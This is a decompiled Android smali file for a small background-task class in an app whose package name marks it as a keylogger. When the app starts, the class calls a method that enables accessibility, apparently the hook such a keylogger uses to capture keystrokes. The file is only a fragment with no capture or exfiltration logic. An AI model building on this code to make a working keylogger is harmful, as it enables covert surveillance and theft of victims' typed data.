.class Lcom/bshu2/androidkeylogger/MainActivity$Startup;
.super Landroid/os/AsyncTask;
.source "MainActivity.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/bshu2/androidkeylogger/MainActivity;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x22
    name = "Startup"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        ">;"
    }
.end annotation


# instance fields
.field private final this$0:Lcom/bshu2/androidkeylogger/MainActivity;


# direct methods
.method public constructor <init>(Lcom/bshu2/androidkeylogger/MainActivity;)V
    .locals 5

    .prologue
    .line 29
    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    invoke-direct {v3}, Landroid/os/AsyncTask;-><init>()V

    move-object v3, v0

    move-object v4, v1

    iput-object v4, v3, Lcom/bshu2/androidkeylogger/MainActivity$Startup;->this$0:Lcom/bshu2/androidkeylogger/MainActivity;

    return-void
.end method

.method static access$0(Lcom/bshu2/androidkeylogger/MainActivity$Startup;)Lcom/bshu2/androidkeylogger/MainActivity;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/bshu2/androidkeylogger/MainActivity$Startup;->this$0:Lcom/bshu2/androidkeylogger/MainActivity;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method protected bridge doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    move-object v4, v1

    check-cast v4, [Ljava/lang/Void;

    invoke-virtual {v3, v4}, Lcom/bshu2/androidkeylogger/MainActivity$Startup;->doInBackground([Ljava/lang/Void;)Ljava/lang/Void;

    move-result-object v3

    move-object v0, v3

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/Void;)Ljava/lang/Void;
    .locals 4
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 27
    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    iget-object v3, v3, Lcom/bshu2/androidkeylogger/MainActivity$Startup;->this$0:Lcom/bshu2/androidkeylogger/MainActivity;

    invoke-virtual {v3}, Lcom/bshu2/androidkeylogger/MainActivity;->enableAccessibility()V

    .line 28
    const/4 v3, 0x0

    check-cast v3, Ljava/lang/Void;

    move-object v0, v3

    return-object v0
.end method
